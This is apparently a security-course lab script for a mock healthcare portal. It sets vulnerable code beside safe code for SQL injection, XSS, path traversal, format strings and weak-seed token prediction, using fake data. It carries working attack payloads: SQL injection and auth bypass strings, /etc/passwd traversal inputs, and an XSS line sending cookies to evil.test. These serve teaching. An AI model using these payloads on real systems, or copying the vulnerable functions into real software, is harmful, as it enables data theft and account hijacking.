#!/usr/bin/env python3
"""
Lab 4 - Secure Input Processing Module
Healthcare Data Portal: Input Validation, Secure Randomness & Injection Prevention

Sections
    1. Input Validation Engine (email, filename, file path)
    2. SQL Injection  (vulnerable vs parameterized)
    3. Cross-Site Scripting (XSS) prevention
    4. Format-string / buffer-overflow awareness (Python analogue; see format_string_demo.c)
    5. Secure random number generation + 1000-value distribution analysis
    6. Entropy analysis + weak-seed token prediction attack

Run:   python3 secure_input_module.py            (runs every demo, ~2 seconds)
Needs: Python 3.8+ ; matplotlib only for the optional histogram figure.
"""

import html
import math
import os
import random
import re
import secrets
import sqlite3
import time
from collections import Counter

# ----------------------------------------------------------------------------
# Pretty printing helpers (only cosmetic)
# ----------------------------------------------------------------------------
def banner(title):
    print("\n" + "=" * 78)
    print(title)
    print("=" * 78)


def show(label, value):
    print(f"  {label:<38} -> {value}")


# ============================================================================
# 1. INPUT VALIDATION ENGINE   (whitelist approach: define what IS allowed)
# ============================================================================

# ---- (A) Email --------------------------------------------------------------
# local part : letters, digits and . _ % + -   (no spaces, no < > ' " ; etc.)
# domain     : dot-separated labels of letters/digits/hyphens (hyphen not at the
#              start or end of a label) and an alphabetic TLD of 2+ letters.
_EMAIL_RE = re.compile(
    r"[A-Za-z0-9._%+\-]+"                     # username
    r"@"
    r"(?:[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?\.)+"   # domain labels
    r"[A-Za-z]{2,24}"                          # top level domain
)


def validate_email(email):
    """Return (True, reason) or (False, reason). Uses fullmatch, NOT match/$,
    because '$' also matches just before a trailing newline (a classic bypass)."""
    if not isinstance(email, str):
        return False, "not a string"
    if len(email) > 254:
        return False, "too long (max 254)"
    if any(c in email for c in "<>\"'`;\\ \t\r\n\x00"):
        return False, "contains dangerous / illegal characters (possible script)"
    if not _EMAIL_RE.fullmatch(email):
        return False, "does not match username@domain.tld whitelist pattern"
    local, domain = email.rsplit("@", 1)
    if len(local) > 64:
        return False, "username part too long (max 64)"
    if ".." in local or local.startswith(".") or local.endswith("."):
        return False, "invalid dots in username"
    if ".." in domain:
        return False, "invalid domain (consecutive dots)"
    return True, "valid"


# ---- (B) Filename -----------------------------------------------------------
# First char must be a letter/digit/underscore (so no hidden files like .env),
# the rest may be letters, digits, underscore or dot.  ".." anywhere is refused.
_FILENAME_RE = re.compile(r"[A-Za-z0-9_][A-Za-z0-9_.]{0,99}")


def validate_filename(name):
    if not isinstance(name, str) or not name:
        return False, "empty or not a string"
    if "\x00" in name:
        return False, "null byte"
    if "/" in name or "\\" in name:
        return False, "path separator not allowed in a filename"
    if ".." in name:
        return False, "contains '..' (path traversal)"
    if name.startswith("."):
        return False, "hidden file not allowed"
    if not _FILENAME_RE.fullmatch(name):
        return False, "only letters, digits, '_' and '.' allowed (max 100 chars)"
    return True, "valid"


# ---- (C) File path ----------------------------------------------------------
SAFE_BASE_DIR = os.path.realpath(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                              "safe_uploads"))


def validate_file_path(user_path, base_dir=SAFE_BASE_DIR):
    """Normalize the requested path and make sure it stays INSIDE base_dir.
    Returns (True, resolved_path) or (False, reason)."""
    if not isinstance(user_path, str) or not user_path:
        return False, "empty or not a string"
    if "\x00" in user_path:
        return False, "null byte"
    if os.path.isabs(user_path) or re.match(r"^[A-Za-z]:", user_path):
        return False, "absolute paths are not allowed"
    base = os.path.realpath(base_dir)
    # join -> normalize -> resolve symlinks
    resolved = os.path.realpath(os.path.normpath(os.path.join(base, user_path)))
    if os.path.commonpath([base, resolved]) != base:
        return False, f"escapes safe base directory (resolved to {resolved})"
    return True, resolved


# ============================================================================
# 2. SQL INJECTION
# ============================================================================
def setup_database():
    """In-memory SQLite database with a tiny 'users' table (fake data only)."""
    conn = sqlite3.connect(":memory:")
    cur = conn.cursor()
    cur.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, "
                "password TEXT, role TEXT, diagnosis TEXT)")
    cur.executemany(
        "INSERT INTO users (username, password, role, diagnosis) VALUES (?,?,?,?)",
        [("alice",  "alicePass!1",  "patient", "Asthma"),
         ("bob",    "bobPass!2",    "patient", "Diabetes"),
         ("drsmith", "docPass!3",   "doctor",  "N/A"),
         ("admin",  "SuperSecret!", "admin",   "N/A")])
    cur.execute("CREATE TABLE comments (id INTEGER PRIMARY KEY, author TEXT, body TEXT)")
    conn.commit()
    return conn


def vulnerable_lookup(conn, username):
    """!!! VULNERABLE: user input is glued straight into the SQL text."""
    query = "SELECT id, username, role, diagnosis FROM users WHERE username = '" + username + "'"
    return query, conn.execute(query).fetchall()


def secure_lookup(conn, username):
    """SAFE: '?' placeholder -> the driver sends the value as DATA, never as SQL."""
    query = "SELECT id, username, role, diagnosis FROM users WHERE username = ?"
    return query, conn.execute(query, (username,)).fetchall()


def vulnerable_login(conn, username, password):
    query = ("SELECT * FROM users WHERE username = '" + username +
             "' AND password = '" + password + "'")
    return query, conn.execute(query).fetchone() is not None


def secure_login(conn, username, password):
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    return query, conn.execute(query, (username, password)).fetchone() is not None


# ============================================================================
# 3. CROSS-SITE SCRIPTING (XSS)
# ============================================================================
_TAG_RE = re.compile(r"<[^>]*>")


def sanitize_comment(text, max_len=500):
    """INPUT sanitization (defence layer 1): length limit, strip control chars.
    We deliberately do NOT rely on this alone - output encoding is the real fix."""
    if not isinstance(text, str):
        return ""
    text = text[:max_len]
    text = "".join(ch for ch in text if ch == "\n" or ch >= " ")   # drop control chars
    text = _TAG_RE.sub("", text)                                      # strip whole tags
    return text.strip()


def render_comment_vulnerable(comment):
    """!!! VULNERABLE: raw user text placed inside HTML."""
    return "<div class='comment'>" + comment + "</div>"


def render_comment_safe(comment):
    """SAFE: sanitize on the way in AND encode on the way out (defence in depth)."""
    return "<div class='comment'>" + html.escape(sanitize_comment(comment), quote=True) + "</div>"


def render_comment_encode_only(comment):
    """Output encoding alone (the single most important control)."""
    return "<div class='comment'>" + html.escape(comment, quote=True) + "</div>"


# ============================================================================
# 4. FORMAT-STRING / BUFFER-OVERFLOW AWARENESS  (Python analogue)
#    The real C demonstration is in format_string_demo.c
# ============================================================================
class _AppConfig:
    SECRET_KEY = "s3cr3t-signing-key-DO-NOT-LEAK"


def unsafe_greeting(user_input):
    """!!! Like C's printf(user_input): the USER controls the format string."""
    return user_input.format(app=_AppConfig)


def safe_greeting(user_input):
    """Like C's printf("%s", user_input): the user's text is only DATA."""
    return "Hello, {}!".format(user_input)


# ============================================================================
# 5. SECURE RANDOM NUMBER GENERATION
# ============================================================================
def insecure_token(length_bytes=16, rng=random):
    """!!! Mersenne Twister (predictable) - never use for secrets."""
    return "%0*x" % (length_bytes * 2, rng.getrandbits(length_bytes * 8))


def secure_session_token(nbytes=32):
    return secrets.token_urlsafe(nbytes)       # 256 bits of OS randomness


def secure_reset_token(nbytes=32):
    return secrets.token_hex(nbytes)           # 256 bits, hex


def distribution_analysis(values, low, high, label):
    """Bucket values into 10 bins, run a chi-square uniformity test."""
    n = len(values)
    span = high - low + 1
    counts = Counter(values)
    expected = n / span
    chi2 = sum((counts.get(v, 0) - expected) ** 2 / expected for v in range(low, high + 1))
    df = span - 1
    crit = 123.23 if df == 99 else None            # chi-square critical value, df=99, alpha=0.05
    bins = [0] * 10
    for v in values:
        bins[min(9, (v - low) * 10 // span)] += 1
    print(f"\n  {label}")
    print(f"    n={n}  min={min(values)}  max={max(values)}  mean={sum(values)/n:.2f} "
          f"(ideal {(low+high)/2:.1f})")
    print(f"    10-bin histogram : {bins}   (ideal 100 each)")
    verdict = "looks uniform" if crit and chi2 < crit else "NOT uniform"
    print(f"    chi-square = {chi2:.1f}  (critical 123.2 @ 5%, df=99)  -> {verdict}")
    return bins, chi2


# ============================================================================
# 6. ENTROPY ANALYSIS
# ============================================================================
def shannon_entropy_bits_per_symbol(data):
    counts = Counter(data)
    n = len(data)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def weak_seed_attack_demo():
    """
    Scenario: a badly written server seeds Python's Mersenne Twister with the
    time it BOOTED (whole seconds) and issues session tokens from it.
      1. Attacker signs up and receives their own token (token #1).
      2. Attacker guesses the boot time (any second in the last 24 h = 86,400
         candidates), re-creates the generator and finds the seed that yields
         token #1.
      3. Attacker now simply asks the same generator for the NEXT outputs ->
         those are the victims' session tokens.  Session hijacked.
    """
    boot_time = int(time.time()) - 5231          # server "booted" ~87 minutes ago
    server_rng = random.Random(boot_time)         # WEAK: seed = timestamp
    attacker_token = insecure_token(8, server_rng)   # handed to the attacker
    victim_token = insecure_token(8, server_rng)     # handed to the victim next
    print(f"  Attacker's own token (observed) : {attacker_token}")
    print(f"  Victim's token (secret)         : {victim_token}")

    now = int(time.time())
    t0 = time.perf_counter()
    found, tries = None, 0
    for guess in range(now, now - 86400, -1):         # search last 24 hours
        tries += 1
        rng = random.Random(guess)
        if insecure_token(8, rng) == attacker_token:
            found = guess
            predicted_victim = insecure_token(8, rng)   # the very next output
            break
    dt = time.perf_counter() - t0
    if found is not None:
        print(f"  Seed recovered after {tries:,} guesses in {dt:.3f}s -> seed = {found}")
        print(f"  PREDICTED victim token          : {predicted_victim}")
        print(f"  Attack successful?              : {predicted_victim == victim_token}  "
              f"<- session hijacked")
    # Secure comparison
    s1, s2 = secure_session_token(), secure_session_token()
    print(f"\n  Same attack on secrets.token_urlsafe(32):")
    print(f"    token #1 = {s1}")
    print(f"    token #2 = {s2}   (no seed, no state to recover)")
    space = 2 ** 256
    yrs = space / 1e12 / (365 * 24 * 3600)
    print(f"    search space 2^256 = {space:.2e}; at 10^12 guesses/s that is ~{yrs:.1e} years")


def entropy_table():
    print("\n  Theoretical entropy of different secrets")
    rows = [
        ("4-digit PIN (random digits)",              4 * math.log2(10)),
        ("Token from time-based seed (24h window)",  math.log2(86400)),
        ("random.randint(1,100)",                    math.log2(100)),
        ("secrets.token_hex(16)  (128-bit)",         128.0),
        ("secrets.token_urlsafe(32)  (256-bit)",     256.0),
    ]
    print(f"    {'Secret':<44}{'Entropy (bits)':>16}{'Guesses to exhaust':>24}")
    for name, bits in rows:
        print(f"    {name:<44}{bits:>16.1f}{2 ** bits:>24.3e}")


# ============================================================================
# "NAIVE DEFENCES THAT FAIL"  (used in report section B)
# ============================================================================
def naive_path_filter(p):
    return p.replace("../", "")                # blacklist: delete "../" once


def naive_xss_filter(text):
    return text.replace("<script>", "")        # blacklist: delete "<script>" once


# ============================================================================
# DEMONSTRATIONS
# ============================================================================
def setup_safe_dir():
    os.makedirs(SAFE_BASE_DIR, exist_ok=True)
    with open(os.path.join(SAFE_BASE_DIR, "report.txt"), "w") as f:
        f.write("Patient summary report (fake data)\n")


def demo_validation():
    banner("SECTION 1 - INPUT VALIDATION ENGINE")
    print("\n[A] Email validation")
    emails = ["john.doe@hospital.com", "nurse_1+ward@clinic.ca",
              "<script>alert(1)</script>@evil.com", "user@localhost", "user@-bad-.com",
              "user@domain", "a..b@site.com", "user@site.com\n", "user@site..com", "' OR 1=1--@x.com"]
    for e in emails:
        ok, why = validate_email(e)
        show(repr(e), ("ACCEPT" if ok else "REJECT") + f"  ({why})")

    print("\n[B] Filename validation")
    names = ["report_2026.pdf", "lab_results.v2.txt", "../../etc/passwd", "..\\windows\\system32",
             ".env", ".htaccess", "notes/../secret.txt", "file name.txt", "a..b.txt", "evil.php%00.jpg",
             "x" * 101]
    for n in names:
        ok, why = validate_filename(n)
        show(repr(n if len(n) < 40 else n[:12] + "...(101 chars)"), ("ACCEPT" if ok else "REJECT") + f"  ({why})")

    print("\n[C] File path validation (safe base dir = ./safe_uploads)")
    paths = ["report.txt", "./report.txt", "sub/../report.txt", "../secret.txt",
             "../../../../etc/passwd", "/etc/passwd", "....//....//etc/passwd",
             "C:\\Windows\\win.ini", "report.txt\x00.png"]
    for p in paths:
        ok, res = validate_file_path(p)
        show(repr(p), "ACCEPT" if ok else "REJECT  (" + res[:110] + ")")


def demo_sqli():
    banner("SECTION 2 - SQL INJECTION (attack demonstration)")
    conn = setup_database()
    print("\n[1] Normal use: username = 'alice'")
    q, rows = vulnerable_lookup(conn, "alice")
    print("  Vulnerable query :", q)
    print("  Rows returned    :", rows)

    payload = "' OR '1'='1"
    print(f"\n[2] ATTACK - payload = {payload!r}")
    q, rows = vulnerable_lookup(conn, payload)
    print("  Vulnerable query :", q)
    print(f"  Rows returned    : {len(rows)} rows  <- ENTIRE users table leaked")
    for r in rows:
        print("     ", r)

    print("\n[3] SAME payload against the SECURE (parameterized) query")
    q, rows = secure_lookup(conn, payload)
    print("  Secure query     :", q, "  params =", (payload,))
    print(f"  Rows returned    : {len(rows)} rows  <- payload treated as a (non-existent) username")

    print("\n[4] Authentication bypass:  username = \"admin'--\", password = 'wrong'")
    q, ok = vulnerable_login(conn, "admin'--", "wrong")
    print("  Vulnerable query :", q)
    print("  Logged in?       :", ok, " <- attacker is admin WITHOUT the password")
    q, ok = secure_login(conn, "admin'--", "wrong")
    print("  Secure query     :", q)
    print("  Logged in?       :", ok)

    print("\n[5] UNION attack (dumping passwords):")
    union = "x' UNION SELECT id, username, password, role FROM users--"
    q, rows = vulnerable_lookup(conn, union)
    print("  Vulnerable result:", rows)
    q, rows = secure_lookup(conn, union)
    print("  Secure result    :", rows)

    print("\n[6] Naive defence that FAILS: stripping the word 'OR'")
    naive = "' oR '1'='1".replace("OR", "")          # case-sensitive -> bypassed
    q, rows = vulnerable_lookup(conn, naive)
    print(f"  input {naive!r} still returns {len(rows)} rows")
    conn.close()


def demo_xss():
    banner("SECTION 3 - CROSS-SITE SCRIPTING (attack demonstration)")
    conn = setup_database()
    payloads = ["Great doctor, very helpful!",
                "<script>alert('Hacked')</script>",
                "<img src=x onerror=alert(1)>",
                "\"><script>document.location='http://evil.test/?c='+document.cookie</script>"]
    for p in payloads:
        print(f"\n  User comment : {p}")
        print(f"   VULNERABLE  : {render_comment_vulnerable(p)}")
        print(f"   SAFE (both) : {render_comment_safe(p)}")
        print(f"   encode-only : {render_comment_encode_only(p)}")
        conn.execute("INSERT INTO comments (author, body) VALUES (?, ?)", ("guest", sanitize_comment(p)))

    print("\n  Naive blacklist filter FAILS:")
    for p in ["<SCRIPT>alert(1)</SCRIPT>", "<scr<script>ipt>alert(1)</scr</script>ipt>"]:
        out = naive_xss_filter(p)
        print(f"   input {p!r}\n     after naive filter -> {out!r}   still dangerous: {'<script' in out.lower()}")
    conn.close()


def demo_path_traversal():
    banner("PATH TRAVERSAL (attack demonstration)")
    setup_safe_dir()
    attack = "../../../../etc/passwd"
    naive_base = SAFE_BASE_DIR
    naive_result = os.path.normpath(os.path.join(naive_base, attack))
    print(f"\n  Vulnerable code: open(base + '/' + user_input)")
    print(f"    user_input = {attack!r}")
    print(f"    resolves to   : {naive_result}   <- OUTSIDE the safe directory")
    ok, res = validate_file_path(attack)
    print(f"  Secure validate_file_path -> {'ACCEPT' if ok else 'REJECT'}: {res[:90]}")

    bypass = "....//....//....//....//....//etc/passwd"
    print(f"\n  Naive defence: remove '../' once -> {naive_path_filter(bypass)!r}"
          "   <- '../' re-appears (bypass)")
    print(f"  Naive result resolves to : "
          f"{os.path.normpath(os.path.join(SAFE_BASE_DIR, naive_path_filter(bypass)))}")
    ok, res = validate_file_path(naive_path_filter(bypass))
    print(f"  Secure validate_file_path on the filtered value -> {'ACCEPT' if ok else 'REJECT'}: {res[:80]}")
    ok, res = validate_file_path(bypass)
    print(f"  Secure validate_file_path on the RAW value      -> {'ACCEPT' if ok else 'REJECT'}"
          f"  ({'stays inside base dir, harmless odd filename' if ok else 'blocked'})")
    ok, res = validate_file_path("report.txt")
    print(f"\n  Legitimate request 'report.txt' -> {'ACCEPT' if ok else 'REJECT'}: {res}")


def demo_format_string():
    banner("SECTION 4 - FORMAT STRING & BUFFER OVERFLOW AWARENESS")
    attack = "Name: {app.SECRET_KEY}"
    print("\n  Python analogue of printf(user_input):")
    print(f"   user input           : {attack!r}")
    print(f"   UNSAFE  -> {unsafe_greeting(attack)!r}   <- secret leaked")
    print(f"   SAFE    -> {safe_greeting(attack)!r}")
    print("\n  See format_string_demo.c for the real C version:")
    print("     printf(user_input);      <- attacker sends %x %x %x and reads the stack")
    print('     printf("%s", user_input); <- safe, input is only data')
    print("     strcpy(buf, input);      <- classic buffer overflow (no length check)")
    print("     snprintf(buf, sizeof buf, \"%s\", input); <- bounded copy")


def demo_randomness():
    banner("SECTION 5 - SECURE RANDOM NUMBER GENERATION")
    print("\n  Session / password-reset tokens:")
    for i in range(3):
        print(f"   session token {i+1}: {secure_session_token()}")
    for i in range(3):
        print(f"   reset   token {i+1}: {secure_reset_token()}")
    print("\n  Insecure token (random module) for comparison:")
    print(f"   {insecure_token(16)}   <- looks random but is predictable")

    random.seed()      # default seeding for the demo
    ins = [random.randint(1, 100) for _ in range(1000)]
    sec = [secrets.randbelow(100) + 1 for _ in range(1000)]     # shift 0..99 -> 1..100
    b1, c1 = distribution_analysis(ins, 1, 100, "random.randint(1,100)          x 1000")
    b2, c2 = distribution_analysis(sec, 1, 100, "secrets.randbelow(100)+1        x 1000")
    print("\n  KEY INSIGHT: both pass the statistical test. Uniform distribution does NOT mean")
    print("  unpredictable. Security depends on how hard the NEXT value is to guess (Section 6).")
    return b1, b2, c1, c2


def demo_entropy():
    banner("SECTION 6 - ENTROPY ANALYSIS & TOKEN PREDICTION ATTACK")
    entropy_table()
    sample = "".join(secure_reset_token(16) for _ in range(500))
    h = shannon_entropy_bits_per_symbol(sample)
    print(f"\n  Measured Shannon entropy of 500 secure hex tokens: {h:.3f} bits/char "
          f"(max 4.000 for hex)")
    print("\n  Weak-seed attack (token prediction -> session hijacking):")
    weak_seed_attack_demo()


def make_histogram(b1, b2, path):
    try:
        import matplotlib
        matplotlib.use("Agg")
        import matplotlib.pyplot as plt
    except Exception:
        print("  (matplotlib not installed - skipping histogram figure)")
        return
    labels = [f"{i*10+1}-{i*10+10}" for i in range(10)]
    fig, ax = plt.subplots(1, 2, figsize=(9, 3.2), sharey=True)
    for a, data, title, col in ((ax[0], b1, "random.randint(1,100)", "#c0504d"),
                                (ax[1], b2, "secrets.randbelow(100)+1", "#2e75b6")):
        a.bar(labels, data, color=col)
        a.axhline(100, ls="--", color="k", lw=1)
        a.set_title(title + " (n=1000)", fontsize=10)
        a.tick_params(axis="x", rotation=60, labelsize=7)
    ax[0].set_ylabel("count per bin (ideal = 100)")
    plt.tight_layout()
    plt.savefig(path, dpi=160)
    print(f"  Histogram saved to {path}")


def main():
    print("LAB 4 - SECURE INPUT PROCESSING MODULE (Healthcare Data Portal)")
    setup_safe_dir()
    demo_validation()
    demo_sqli()
    demo_xss()
    demo_path_traversal()
    demo_format_string()
    b1, b2, _, _ = demo_randomness()
    demo_entropy()
    make_histogram(b1, b2, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                        "randomness_distribution.png"))
    banner("ALL DEMONSTRATIONS COMPLETE")


if __name__ == "__main__":
    main()
